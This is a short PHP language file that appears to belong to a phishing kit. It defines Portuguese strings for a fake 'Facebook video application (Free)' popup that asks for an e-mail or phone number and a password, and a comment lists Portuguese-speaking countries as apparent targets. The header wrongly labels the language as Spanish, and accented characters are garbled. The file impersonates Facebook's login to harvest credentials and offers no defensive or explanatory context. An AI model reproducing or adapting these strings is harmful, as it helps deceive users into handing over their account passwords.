<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'pt';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Aplica��o Facebook';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook aplica��o de v�deo (Free)';
$lang['POPUP_DESCRIPCION'] = '�ESQUECEU A SENHA?';
$lang['POPUP_CORREO'] = 'E-mail ou telefone';
$lang['POPUP_CONTRASENA'] = 'Senha';
$lang['POPUP_SUBMIT'] = 'ENTRAR';
$lang['POPUP_CANDADO'] = 'Esta aplica��o n�o est� autorizado a publicar no Facebook.';

/*
array("Brazil", "Mozambique", "Angola", "Portugal", "Guinea-Bissau", "Timor-leste", "Macau", "Cape Verde", "Sao Tome and Principe")
*/